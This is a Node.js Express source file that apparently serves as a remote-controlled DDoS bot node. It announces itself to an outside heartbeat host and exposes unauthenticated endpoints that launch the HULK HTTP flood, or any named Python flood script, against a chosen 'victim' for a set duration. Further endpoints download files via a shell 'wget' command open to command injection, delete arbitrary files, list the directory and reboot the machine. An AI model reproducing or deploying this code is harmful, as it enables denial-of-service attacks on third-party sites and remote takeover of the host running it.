const express = require('express')
const { spawn } = require('child_process');
const app = express()
const delay = require('delay')
const axios = require('axios')
var fs = require('fs')
const lockdown = false
const port = 3000 // access port
const managerIP = "" //only IP that can send commands in if lockdown === true.

let machineBusy = false
let pythonActive = false
let python = null

function inithb() {
    var options = { method: 'POST', url: 'http://heartbeat.hypernovus.xyz:30120/hb/' };

    axios.request(options).then(function (response) {
        console.log(response.data);
    }).catch(function (error) {
        console.error(error);
    });
}

inithb()

app.use((req, res, next) => {
    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    res.setHeader('Acces-Control-Allow-Origin', '*');
    res.setHeader('Acces-Control-Allow-Methods', 'GET,POST,PUT,PATCH,DELETE');
    res.setHeader('Acces-Contorl-Allow-Methods', 'Content-Type', 'Authorization');
    if (lockdown) {
        if (!(ip === managerIP)) {
            res.send(403, { error: "UNAUTHORIZED&_FUCK_OFF" })
        }
    }
    next();
})

app.get('/layer7/:victim/:time', (req, res) => {
    if (!(machineBusy)) {
        let victim = req.params.victim
        let timelimit = req.params.time
        if (isNaN(timelimit)) {
            res.send(405, { error: "INVALID_TIME_LIMIT" })
        }
        else {
            mainT(victim, timelimit)
            machineBusy = true
            res.send(200, { success: `Attacking ${victim} with TL ${timelimit}` })
        }
    }
    else {
        res.send(405, { error: "MACHINE_IS_BUSY" })
    }
})

app.get('/layer7adv/:victim/:time/:script', (req, res) => {
    if (!(machineBusy)) {
        let victim_ = req.params.victim
        let victim = (victim_.replace(/ç/g, "/"))
        let timelimit = req.params.time
        let script = req.params.script
        if (isNaN(timelimit)) {
            res.send(405, { error: "INVALID_TIME_LIMIT" })
        }
        else {
            if (!(script.includes(".py"))){
                advancedPython(victim, timelimit, script)
                machineBusy = true
                res.send(200, { success: `Attacking ${victim} with TL ${timelimit}` })
            }
            else{
                res.send(405, { error: "INVALID_SCRIPT_NAME" })
            }

        }
    }
    else {
        res.send(405, { error: "MACHINE_IS_BUSY" })
    }
})

app.get('/remfile/:valx/', (req, res) => {
    const path = './' + req.params.valx
    try {
        fs.unlinkSync(path)
        res.send(200)
    } catch (err) {
        res.send(500, { err })
    }

})

app.get('/addfile/:fin/:exn/', (req, res) => {
    let cp = require('child_process')
    let filn = ((req.params.fin).replace(/ç/g, "/"))
    let exn = req.params.exn
    let download = async function (filename) {
        let command = `wget ${filename}`;
        let result = cp.execSync(command);
        res.send(200, {result})
    };
    async function test(filn) {
        await download(filn)
    }
    test(filn)
})

app.get('/listdir/', (req, res) => {
    let folderarr = []
    const testFolder = './';
    const fs = require('fs');

    fs.readdirSync(testFolder).forEach(file => {
        folderarr.push(file)
    });
    res.send(200, { folderarr })
})

app.get('/reboot/', (req, res) => {
    let cp = require('child_process')
    let rboot = async function () {
        let command = `reboot`;
        res.send(200)
        cp.execSync(command);
    };
    async function test() {
        await rboot()
    }
    test()
    res.send(200)
})

app.get('/layer7stop/', (req, res) => {
    if (pythonActive) {
        pythonTermination()
        res.send(200)
    }
    else {
        res.send(405, { error: "NO_PROCESSES_ACTIVE" })
    }
});

async function mainT(victim, time) {
    if (!(pythonActive)) {
        machineBusy = true
        pythonActive = true
        python = spawn('/usr/bin/python2', ['/l7flood/hulk.py', `http://${victim}`]);
        machineBusy = true
        pythonActive = true
        await delay(time * 1000)
        if (pythonActive) {
            pythonTermination()
        }
    }
}

async function advancedPython(victim, time, scriptname) {
    if (!(pythonActive)) {
        machineBusy = true
        pythonActive = true
        python = spawn('/usr/bin/python2', [`/home/ubuntu/l7flood/${scriptname}.py`, `http://${victim}`]);
        machineBusy = true
        pythonActive = true
        await delay(time * 1000)
        if (pythonActive) {
            pythonTermination()
        }
    }
}

function pythonTermination(){
    python.kill("SIGINT")
    python.kill("SIGTERM")
    console.log("KILLED PYTHON.")
    machineBusy = false
    pythonActive = false
}

app.listen(port, () => console.log(`App listening on port ${port}!`))
